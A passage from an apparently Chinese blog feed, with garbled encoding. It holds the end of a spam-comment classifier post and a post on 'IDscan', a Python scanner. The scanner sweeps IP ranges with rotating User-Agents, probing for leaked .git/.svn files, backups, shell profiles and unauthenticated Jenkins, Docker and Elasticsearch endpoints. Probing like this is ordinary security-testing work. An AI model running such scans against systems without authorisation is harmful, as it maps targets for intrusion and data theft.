                      charset=<span class="hljs-string">&#x27;utf8mb4&#x27;</span>)    cursor = conn.cursor()    cursor.execute(<span class="hljs-string">&quot;select count(*) from `result`&quot;</span>);    count = cursor.fetchall()    cursor = conn.cursor(cursor=pymysql.cursors.DictCursor)    cursor.execute(<span class="hljs-string">&quot;select * from `result` limit &quot;</span>+<span class="hljs-built_in">str</span>(page)+<span class="hljs-string">&quot;,&quot;</span>+<span class="hljs-built_in">str</span>(limit));    data_dict = []    result = cursor.fetchall()    <span class="hljs-keyword">for</span> field <span class="hljs-keyword">in</span> result:        data_dict.append(field)    table_result = &#123;<span class="hljs-string">&quot;code&quot;</span>: <span class="hljs-number">0</span>, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;count&quot;</span>: count[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;data&quot;</span>: data_dict&#125;    cursor.close()    conn.close()    <span class="hljs-keyword">return</span> jsonify(table_result)</code></pre><p>jsè„šæœ¬</p><pre><code class="hljs js">upload.render(&#123; <span class="hljs-comment">//å…è®¸ä¸Šä¼ çš„æ–‡ä»¶åç¼€</span>elem: <span class="hljs-string">&#x27;#test_upload&#x27;</span>,url: <span class="hljs-string">&#x27;http://127.0.0.1:5000/upload&#x27;</span>,field: <span class="hljs-string">&#x27;myfile&#x27;</span>,accept: <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-comment">//æ™®é€šæ–‡ä»¶</span>exts: <span class="hljs-string">&#x27;txt&#x27;</span>, <span class="hljs-comment">//åªå…è®¸ä¸Šä¼ txtæ–‡ä»¶</span>before: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">obj</span>) </span>&#123; <span class="hljs-comment">//objå‚æ•°åŒ…å«çš„ä¿¡æ¯ï¼Œè·Ÿ chooseå›è°ƒå®Œå…¨ä¸€è‡´ï¼Œå¯å‚è§ä¸Šæ–‡ã€‚</span>layer.load(); <span class="hljs-comment">//ä¸Šä¼ loading</span>&#125;,done: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>) </span>&#123;layer.closeAll(<span class="hljs-string">&#x27;loading&#x27;</span>);layer.msg(<span class="hljs-string">&#x27;ä¸Šä¼ æˆåŠŸ&#x27;</span>);<span class="hljs-built_in">console</span>.log(res)path = res.pathinsTb.reload(&#123;where: &#123;<span class="hljs-string">&#x27;path&#x27;</span>: path&#125;&#125;);$.ajax(&#123;type: <span class="hljs-string">&#x27;GET&#x27;</span>,url: <span class="hljs-string">&#x27;http://127.0.0.1:5000/ksh&#x27;</span>,data: &#123;<span class="hljs-string">&#x27;path&#x27;</span>: path&#125;,success: <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>) </span>&#123;<span class="hljs-keyword">var</span> option = &#123;tooltip: &#123;trigger: <span class="hljs-string">&#x27;item&#x27;</span>,formatter: <span class="hljs-string">&#x27;&#123;a&#125; &lt;br/&gt;&#123;b&#125; : &#123;c&#125; (&#123;d&#125;%)&#x27;</span>&#125;,legend: &#123;orient: <span class="hljs-string">&#x27;vertical&#x27;</span>,left: <span class="hljs-string">&#x27;left&#x27;</span>,data: [<span class="hljs-string">&#x27;æœ‰æ•ˆè¯„è®º&#x27;</span>, <span class="hljs-string">&#x27;åƒåœ¾è¯„è®º&#x27;</span>]&#125;,series: [&#123;name: <span class="hljs-string">&#x27;è¯„è®ºæ¯”ä¾‹&#x27;</span>,type: <span class="hljs-string">&#x27;pie&#x27;</span>,radius: <span class="hljs-string">&#x27;55%&#x27;</span>,center: [<span class="hljs-string">&#x27;50%&#x27;</span>, <span class="hljs-string">&#x27;60%&#x27;</span>],data: [&#123;value: result.good,name: <span class="hljs-string">&#x27;æœ‰æ•ˆè¯„è®º&#x27;</span>&#125;,&#123;value: result.bad,name: <span class="hljs-string">&#x27;åƒåœ¾è¯„è®º&#x27;</span>&#125;],emphasis: &#123;itemStyle: &#123;shadowBlur: <span class="hljs-number">10</span>,shadowOffsetX: <span class="hljs-number">0</span>,shadowColor: <span class="hljs-string">&#x27;rgba(0, 0, 0, 0.5)&#x27;</span>&#125;&#125;&#125;]&#125;;myCharts.setOption(option)&#125;&#125;);</code></pre><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808175245654.png" alt="image-20210808175245654"></p><p>æœ€åå‘ˆç°çš„æ•ˆæœ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20210808175722246.png" alt="image-20210808175722246"></p><p>å‚è€ƒï¼š</p><blockquote><p><a href="https://github.com/NTDXYG/ProjectsForChineseGraduates">https://github.com/NTDXYG/ProjectsForChineseGraduates</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æœ´ç´ è´å¶æ–¯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IDscan</title>
    <link href="/2021/07/28/IDscan/"/>
    <url>/2021/07/28/IDscan/</url>
    
    <content type="html"><![CDATA[<p>ä¸€ä¸ªé’ˆå¯¹URLçš„ç®€å•æ•æ„Ÿä¿¡æ¯æ‰«æå™¨</p><p>æ­¤å·¥å…·å¯ä»¥ç±»ä¼¼äºdirsearchï¼Œå¦‚æœå­—å…¸è¶³å¤Ÿå¤§ï¼Œå®Œå…¨å¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœ</p><span id="more"></span><h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><blockquote><p>python3</p><p>ä½¿ç”¨çš„åº“ï¼š threadpool</p><p>pip install requests threadpool</p></blockquote><p>ä¸»è¦æ–‡ä»¶</p><ul><li>IDscan<ul><li>get_ip_list.py<ul><li>è®²IPæ®µè½¬æ¢æˆipåˆ—è¡¨ï¼Œå†è¿›è¡Œæ‰«æ</li></ul></li><li>IDscan.py<ul><li>threadpool  ä½¿ç”¨å¤šçº¿ç¨‹åŠ å¿«æ‰«æé€Ÿåº¦</li><li>random User-Agent   éšæœºä½¿ç”¨ä»£ç†é˜²æ­¢è¢«å°</li></ul></li><li>rules.txt<ul><li>æ¼æ´è§„åˆ™</li></ul></li><li>url_list.txt<ul><li>å°†è¢«æ£€æµ‹å†…å®¹å¡«å…¥å…¶ä¸­</li></ul></li></ul></li></ul><h1 id="æŠ€æœ¯å®ç°"><a href="#æŠ€æœ¯å®ç°" class="headerlink" title="æŠ€æœ¯å®ç°"></a>æŠ€æœ¯å®ç°</h1><p>è¯¥è„šæœ¬å¯ä»¥å®ç°ä¸‰ç§ç±»å‹çš„æ‰«æï¼Œå…³é”®åœ¨äºç½‘ç«¯æµ‹è¯•ï¼Œå°†ç½‘ç«¯è½¬æ¢ä¸ºipåˆ—è¡¨ï¼Œå†å¯¹æ¯ä¸€ä¸ªipè¿›è¡Œæ‰«æ</p><ul><li>ç½‘æ®µ</li><li>å•ä¸ªæˆ–å¤šä¸ªç½‘å€</li><li>æŸä¸ªç½‘ç«™çš„ç‰¹æ®Šç«¯å£</li></ul><h2 id="æ¢æµ‹åŸç†"><a href="#æ¢æµ‹åŸç†" class="headerlink" title="æ¢æµ‹åŸç†"></a>æ¢æµ‹åŸç†</h2><p>å°†rule.txtä¸­å¯èƒ½å­˜åœ¨æ³„éœ²çš„urlä¸å¾…æ£€æµ‹çš„ç½‘å€æ‹¼æ¥åï¼Œè¿›è¡Œè®¿é—®ï¼Œä¹‹åæŸ¥çœ‹çŠ¶æ€ç ï¼Œè‹¥ä¸º200åˆ™å¯èƒ½å­˜åœ¨æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</p><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">verify</span>(<span class="hljs-params">target</span>):</span>    headers_list = [    <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#x27;</span>,    <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0&#x27;</span>,    <span class="hljs-string">&#x27;Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16&#x27;</span>,    <span class="hljs-string">&#x27;Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Version/10.0 Mobile/14D27 Safari/602.1&#x27;</span>,    <span class="hljs-string">&#x27;Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X; zh-CN) AppleWebKit/537.51.1 (KHTML, like Gecko) Mobile/14D27 UCBrowser/11.6.1.1003 Mobile  AliApp(TUnionSDK/0.1.20)&#x27;</span>,    <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3&quot;</span>,    <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;</span>,    <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3&quot;</span>,    <span class="hljs-string">&quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24&quot;</span>,    <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24&quot;</span>    ]    headers = &#123; <span class="hljs-string">&#x27;User-Agent&#x27;</span>: random.choice(headers_list) &#125;    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;rules.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)    txt = f.readlines()    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> txt:        u,j,w = x.strip().split(<span class="hljs-string">&#x27;|&#x27;</span>)        url = target + u        <span class="hljs-keyword">try</span>:            r = requests.get(url,headers=headers,timeout=<span class="hljs-number">3</span>,verify=<span class="hljs-literal">False</span>) <span class="hljs-comment"># http</span>            html = r.text            <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">200</span>:                <span class="hljs-keyword">if</span> j <span class="hljs-keyword">in</span> html:                    print(<span class="hljs-string">&#x27;Find: &#x27;</span> + url +<span class="hljs-string">&#x27; is Leak !!! Leak is &#x27;</span>+ w)                <span class="hljs-keyword">else</span>:                    print(<span class="hljs-string">&#x27;Find: &#x27;</span> + url +<span class="hljs-string">&#x27; is Exist !!!&#x27;</span>)        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:            <span class="hljs-keyword">pass</span></code></pre><h2 id="ç½‘ç«¯æµ‹è¯•"><a href="#ç½‘ç«¯æµ‹è¯•" class="headerlink" title="ç½‘ç«¯æµ‹è¯•"></a>ç½‘ç«¯æµ‹è¯•</h2><p>å°†ipç½‘ç«¯è½¬æ¢ä¸ºipåˆ—è¡¨ </p><pre><code class="hljs python"><span class="hljs-keyword">import</span> os,sysbase = [<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)] + [ <span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>),<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)+<span class="hljs-number">6</span>)]<span class="hljs-comment">#åè¿›åˆ¶0~255è½¬åŒ–ä¸ºäºŒè¿›åˆ¶,è¡¥0åˆ°8ä½</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dec2bin80</span>(<span class="hljs-params">string_num</span>):</span>    num = <span class="hljs-built_in">int</span>(string_num)    mid = []    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        <span class="hljs-keyword">if</span> num == <span class="hljs-number">0</span>: <span class="hljs-keyword">break</span>        num,rem = <span class="hljs-built_in">divmod</span>(num, <span class="hljs-number">2</span>)        mid.append(base[rem])    result = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> mid[::-<span class="hljs-number">1</span>]])    length = <span class="hljs-built_in">len</span>(result)    <span class="hljs-keyword">if</span> length &lt; <span class="hljs-number">8</span>:        result = <span class="hljs-string">&#x27;0&#x27;</span> * (<span class="hljs-number">8</span> - length) + result    <span class="hljs-keyword">return</span> result<span class="hljs-comment">#åè¿›åˆ¶0~255è½¬åŒ–ä¸ºäºŒè¿›åˆ¶,è¡¥0åˆ°32ä½</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dec2bin320</span>(<span class="hljs-params">string_num</span>):</span>    num = <span class="hljs-built_in">int</span>(string_num)    mid = []    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        <span class="hljs-keyword">if</span> num == <span class="hljs-number">0</span>: <span class="hljs-keyword">break</span>        num,rem = <span class="hljs-built_in">divmod</span>(num, <span class="hljs-number">2</span>)        mid.append(base[rem])    result = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> mid[::-<span class="hljs-number">1</span>]])    length = <span class="hljs-built_in">len</span>(result)    <span class="hljs-keyword">if</span> length &lt; <span class="hljs-number">32</span>:        result = <span class="hljs-string">&#x27;0&#x27;</span> * (<span class="hljs-number">32</span> - length) + result    <span class="hljs-keyword">return</span> result<span class="hljs-comment">#åè¿›åˆ¶0~255è½¬åŒ–ä¸ºäºŒè¿›åˆ¶ï¼Œä¸è¡¥é›¶</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dec2bin</span>(<span class="hljs-params">string_num</span>):</span>    num = <span class="hljs-built_in">int</span>(string_num)    mid = []    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        <span class="hljs-keyword">if</span> num == <span class="hljs-number">0</span>: <span class="hljs-keyword">break</span>        num,rem = <span class="hljs-built_in">divmod</span>(num, <span class="hljs-number">2</span>)        mid.append(base[rem])    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">str</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> mid[::-<span class="hljs-number">1</span>]])<span class="hljs-comment">#äºŒè¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bin2dec</span>(<span class="hljs-params">string_num</span>):</span>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(string_num, <span class="hljs-number">2</span>))<span class="hljs-comment">#ipåˆ—è¡¨ç”Ÿæˆ</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">iplist</span>(<span class="hljs-params">string_startip,string_endip</span>):</span>    <span class="hljs-comment">#åˆ†å‰²IPï¼Œç„¶åå°†å…¶è½¬åŒ–ä¸º8ä½çš„äºŒè¿›åˆ¶ä»£ç </span>    start = string_startip.split(<span class="hljs-string">&#x27;.&#x27;</span>)    start_a = dec2bin80(start[<span class="hljs-number">0</span>])    start_b = dec2bin80(start[<span class="hljs-number">1</span>])    start_c = dec2bin80(start[<span class="hljs-number">2</span>])    start_d = dec2bin80(start[<span class="hljs-number">3</span>])    start_bin = start_a + start_b + start_c + start_d    <span class="hljs-comment">#å°†äºŒè¿›åˆ¶ä»£ç è½¬åŒ–ä¸ºåè¿›åˆ¶</span>    start_dec = bin2dec(start_bin)    end = string_endip.split(<span class="hljs-string">&#x27;.&#x27;</span>)    end_a = dec2bin80(end[<span class="hljs-number">0</span>])    end_b = dec2bin80(end[<span class="hljs-number">1</span>])    end_c = dec2bin80(end[<span class="hljs-number">2</span>])    end_d = dec2bin80(end[<span class="hljs-number">3</span>])    end_bin = end_a + end_b + end_c + end_d    <span class="hljs-comment">#å°†äºŒè¿›åˆ¶ä»£ç è½¬åŒ–ä¸ºåè¿›åˆ¶</span>    end_dec = bin2dec(end_bin)    <span class="hljs-comment">#åè¿›åˆ¶ç›¸å‡ï¼Œè·å–ä¸¤ä¸ªIPä¹‹é—´æœ‰å¤šå°‘ä¸ªIP</span>    count = <span class="hljs-built_in">int</span>(end_dec) - <span class="hljs-built_in">int</span>(start_dec)    ip_list = []    <span class="hljs-comment">#ç”ŸæˆIPåˆ—è¡¨</span>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,count + <span class="hljs-number">1</span>):        <span class="hljs-comment">#å°†åè¿›åˆ¶IPåŠ ä¸€ï¼Œå†è½¬åŒ–ä¸ºäºŒè¿›åˆ¶ï¼ˆ32ä½è¡¥é½ï¼‰</span>        plusone_dec = <span class="hljs-built_in">int</span>(start_dec) + i        plusone_dec = <span class="hljs-built_in">str</span>(plusone_dec)        address_bin = dec2bin320(plusone_dec)        <span class="hljs-comment">#åˆ†å‰²IPï¼Œè½¬åŒ–ä¸ºåè¿›åˆ¶</span>        address_a = bin2dec(address_bin[<span class="hljs-number">0</span>:<span class="hljs-number">8</span>])        address_b = bin2dec(address_bin[<span class="hljs-number">8</span>:<span class="hljs-number">16</span>])        address_c = bin2dec(address_bin[<span class="hljs-number">16</span>:<span class="hljs-number">24</span>])        address_d = bin2dec(address_bin[<span class="hljs-number">24</span>:<span class="hljs-number">32</span>])        address = address_a + <span class="hljs-string">&#x27;.&#x27;</span>+ address_b +<span class="hljs-string">&#x27;.&#x27;</span>+ address_c +<span class="hljs-string">&#x27;.&#x27;</span>+ address_d        ip_list.append(address)    <span class="hljs-keyword">return</span> ip_list</code></pre><h2 id="æ‰«æè§„åˆ™"><a href="#æ‰«æè§„åˆ™" class="headerlink" title="æ‰«æè§„åˆ™"></a>æ‰«æè§„åˆ™</h2><p>è¿™é‡Œå®šä¹‰äº†ä¸€äº›å¸¸è§çš„æ•æ„Ÿä¿¡æ¯çš„urlï¼Œä¸»å‡½æ•°é€šè¿‡ä¸€è¡Œä¸€è¡Œè¯»å–è¯¥æ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œç„¶åä¸ç½‘å€æ‹¼æ¥åè®¿é—®</p><pre><code class="hljs coq">/.svn/entries|<span class="hljs-type">dir</span>|<span class="hljs-type">SVN</span>ä¿¡æ¯æ³„éœ²/.git/config|<span class="hljs-type">[core</span>]|<span class="hljs-type">Git</span>ä¿¡æ¯æ³„éœ²/.git/config|<span class="hljs-type">repositoryformatversion</span>|<span class="hljs-type">Git</span>ä¿¡æ¯æ³„éœ².git/refs/stash|<span class="hljs-type">|git</span> stash æ³„éœ²/CVS/Root|<span class="hljs-type">|cvs</span>ä¿¡æ¯æ³„éœ²/CVS/Entries|<span class="hljs-type">|cvs</span>ä¿¡æ¯æ³„éœ²/.hg/|<span class="hljs-type">|.hg</span>æºç æ³„æ¼/.bzr/|<span class="hljs-type">|.bzr</span>ä¿¡æ¯æ³„éœ²/.DS_Store|<span class="hljs-type">|DS_Store</span>æ–‡ä»¶æ³„éœ²/htaccess.txt|<span class="hljs-type">|è®¿é—®æ§åˆ¶æ–‡ä»¶æ³„éœ²</span><span class="hljs-type">/.index</span>.php.swp|<span class="hljs-type">|vim</span>äº¤æ¢æ–‡ä»¶å/.index.php.swn|<span class="hljs-type">|vim</span>äº¤æ¢æ–‡ä»¶å/.index.php.swo|<span class="hljs-type">|vim</span>äº¤æ¢æ–‡ä»¶å/WEB-INF/web.xml|<span class="hljs-type">&lt;?xml</span> version=|<span class="hljs-type">åˆå§‹åŒ–å·¥ç¨‹é…ç½®ä¿¡æ¯æ³„éœ²</span><span class="hljs-type">/WEB</span>-INF/web.xml|<span class="hljs-type">&lt;web</span>-app|<span class="hljs-type">åˆå§‹åŒ–å·¥ç¨‹é…ç½®ä¿¡æ¯æ³„éœ²</span><span class="hljs-type">/crossdomin</span>.xml|<span class="hljs-type">cross</span>-domain-policy|<span class="hljs-type">è·¨åŸŸç­–ç•¥æ–‡ä»¶</span><span class="hljs-type">/icons</span>/|<span class="hljs-type">Index</span> of|<span class="hljs-type">ç›®å½•éå†è·¯å¾„</span><span class="hljs-type">/robots</span>.txt|<span class="hljs-type">Disallow</span>|<span class="hljs-type">çˆ¬è™«é…ç½®æ–‡ä»¶</span><span class="hljs-type">/uddiexplorer</span>/SearchPublicRegistries.jsp|<span class="hljs-type">Search</span> public registries|<span class="hljs-type">Weblogic</span> æœåŠ¡å™¨è¯·æ±‚ä¼ªé€ æ¼æ´/ws_utc/config.<span class="hljs-built_in">do</span>|<span class="hljs-type">tc_container</span>|<span class="hljs-type">Oracle</span> WebLogic ws-utc ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´:<span class="hljs-number">8080</span>/manage|<span class="hljs-type">|Jenkins</span>æœªæˆæƒè®¿é—®å¯æ‰§è¡Œå‘½ä»¤:<span class="hljs-number">8080</span>/script|<span class="hljs-type">|Jenkins</span>æœªæˆæƒè®¿é—®å¯æ‰§è¡Œå‘½ä»¤:<span class="hljs-number">9200</span>/|<span class="hljs-type">|build_hashElasticsearch</span>æœªæˆæƒè®¿é—®:<span class="hljs-number">9200</span>/_cat/indices|<span class="hljs-type">_river</span>|<span class="hljs-type">Elasticsearch</span>æœªæˆæƒè®¿é—®:<span class="hljs-number">9200</span>/_river/_search|<span class="hljs-type">node</span>|<span class="hljs-type">Elasticsearch</span>æœªæˆæƒè®¿é—®:<span class="hljs-number">5984</span>/_config/|<span class="hljs-type">httpd_design_handlers</span>|<span class="hljs-type">CouchDB</span>æœªæˆæƒè®¿é—®:<span class="hljs-number">2375</span>/containers/json|<span class="hljs-type">[|Docker</span>æœªæˆæƒè®¿é—®:<span class="hljs-number">8161</span>/admin/|<span class="hljs-type">|ActiveMQ</span>æœªæˆæƒè®¿é—®:<span class="hljs-number">7001</span>/_async/AsyncResponseService|<span class="hljs-type">|AsyncResponseService</span> RCE/test.php|<span class="hljs-type">|æµ‹è¯•é¡µé¢</span><span class="hljs-type">/test</span>.cgi|<span class="hljs-type">|æµ‹è¯•é¡µé¢</span><span class="hljs-type">/info</span>.php|<span class="hljs-type">|æµ‹è¯•é¡µé¢</span><span class="hljs-type">/login</span>.php|<span class="hljs-type">|ç®¡ç†åå°åœ°å€æ³„éœ²</span><span class="hljs-type">/admin</span>.php|<span class="hljs-type">|ç®¡ç†åå°åœ°å€æ³„éœ²</span><span class="hljs-type">/manager</span>.php|<span class="hljs-type">|ç®¡ç†åå°åœ°å€æ³„éœ²</span><span class="hljs-type">/admin_login</span>.php|<span class="hljs-type">|ç®¡ç†åå°åœ°å€æ³„éœ²</span><span class="hljs-type">/.test</span>.php.swp|<span class="hljs-type">|ç¼–è¾‘å™¨å¤‡ä»½æ–‡ä»¶æ³„éœ²</span><span class="hljs-type">/test</span>.php.bak|<span class="hljs-type">|ç¼–è¾‘å™¨å¤‡ä»½æ–‡ä»¶æ³„éœ²</span><span class="hljs-type">/test</span>.jsp.old|<span class="hljs-type">|ç¼–è¾‘å™¨å¤‡ä»½æ–‡ä»¶æ³„éœ²</span><span class="hljs-type">/cgi</span>~|<span class="hljs-type">|ç¼–è¾‘å™¨å¤‡ä»½æ–‡ä»¶æ³„éœ²</span><span class="hljs-type">/phpmyadmin</span>|<span class="hljs-type">|phpmyadmin</span>åå°æ³„éœ²/phpinfo.php|<span class="hljs-type">|phpinfo</span>é¡µé¢æ³„éœ²/basic/index.php|<span class="hljs-type">|HTTP</span>è®¤è¯æ³„éœ²æ¼æ´/www.rar|<span class="hljs-type">|ç½‘ç«™å¤‡ä»½æ–‡ä»¶</span><span class="hljs-type">/web</span>.zip|<span class="hljs-type">|ç½‘ç«™å¤‡ä»½æ–‡ä»¶</span><span class="hljs-type">/www</span>.zip|<span class="hljs-type">|ç½‘ç«™å¤‡ä»½æ–‡ä»¶ </span><span class="hljs-type">/sitename</span>.tar.gz|<span class="hljs-type">|ç½‘ç«™å¤‡ä»½æ–‡ä»¶</span><span class="hljs-type">/_vti_inf</span>.html|<span class="hljs-type">|Frontpage</span> ä¿¡æ¯æ³„æ¼/_vti_pvt/service.pwd|<span class="hljs-type">|FrontPage</span> pwd æ–‡ä»¶å¯è¯»/.bashrc|<span class="hljs-type">|bashrc</span> ä¿¡æ¯æ³„æ¼/.bash_profile|<span class="hljs-type">|profile</span> ä¿¡æ¯æ³„éœ²/.zshrc|<span class="hljs-type">|zsh</span> ä¿¡æ¯æ³„éœ²</code></pre><h2 id="ä¸»å‡½æ•°"><a href="#ä¸»å‡½æ•°" class="headerlink" title="ä¸»å‡½æ•°"></a>ä¸»å‡½æ•°</h2><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>    print(<span class="hljs-string">&#x27;*&#x27;</span>*<span class="hljs-number">35</span>+<span class="hljs-string">&#x27;&#x27;&#x27;\nIDscan V3.0\n</span><span class="hljs-string">Information disclosure Check.\n&#x27;&#x27;&#x27;</span>+<span class="hljs-string">&#x27;*&#x27;</span>*<span class="hljs-number">35</span>)    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;url_list.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:        url_l = f.readlines()    pool = threadpool.ThreadPool(<span class="hljs-number">255</span>)    ipl = []    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> url_l:        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;http&#x27;</span> <span class="hljs-keyword">in</span> i: <span class="hljs-comment"># website url</span>            ipl.append(i.strip())        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">in</span> i: <span class="hljs-comment"># network segment</span>            start_ip,end_ip = i.split(<span class="hljs-string">&#x27;-&#x27;</span>)            ipl.extend(get_ip_list.iplist(start_ip,end_ip))        <span class="hljs-keyword">elif</span> checkip(i):            ipl.append(i.strip())        <span class="hljs-keyword">else</span>:            print(<span class="hljs-string">&#x27;Unknown form IPï¼š&#x27;</span>+i)    print(<span class="hljs-string">&#x27;Start...&#x27;</span>)        rethr = threadpool.makeRequests(verify, ipl) <span class="hljs-comment"># connect rules</span>    [pool.putRequest(req) <span class="hljs-keyword">for</span> req <span class="hljs-keyword">in</span> rethr]    pool.wait()    print(<span class="hljs-string">&#x27;End...&#x27;</span>)</code></pre><h1 id="url-list-txt-ä½¿ç”¨æ–¹æ³•"><a href="#url-list-txt-ä½¿ç”¨æ–¹æ³•" class="headerlink" title="url_list.txt ä½¿ç”¨æ–¹æ³•"></a>url_list.txt ä½¿ç”¨æ–¹æ³•</h1><ul><li><p><strong>å¦‚æœä½ æƒ³æ‰«æç½‘æ®µ</strong></p><pre><code class="hljs accesslog"><span class="hljs-number">192.168.0.0</span>-<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">255</span><span class="hljs-number">192.167.36.24</span>-<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">39</span>.<span class="hljs-number">255</span></code></pre></li><li><p><strong>if you want to scan special port | å¦‚æœä½ æƒ³æ‰«æç‰¹æ®Šç«¯å£</strong></p><pre><code class="hljs accesslog"><span class="hljs-number">192.168.0.1:8081</span></code></pre></li><li><p><strong>if you wang to scan website url| å¦‚æœä½ æƒ³æ‰«æç½‘ç«™åœ°å€</strong></p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.baidu.comhttps:<span class="hljs-regexp">//</span>www.baidu.comhttp:<span class="hljs-regexp">//</span>www.baidu.com:<span class="hljs-number">81</span></code></pre></li></ul><p>æ‰«æç™¾åº¦çš„ç»“æœ</p><p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210728175634955.png" alt="image-20210728175634955"></p><blockquote><p>å‚è€ƒ:</p><p><a href="https://github.com/zhaijiahui/IDscan">https://github.com/zhaijiahui/IDscan</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>scan</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VPN</title>
    <link href="/2021/07/21/VPN/"/>
    <url>/2021/07/21/VPN/</url>
    
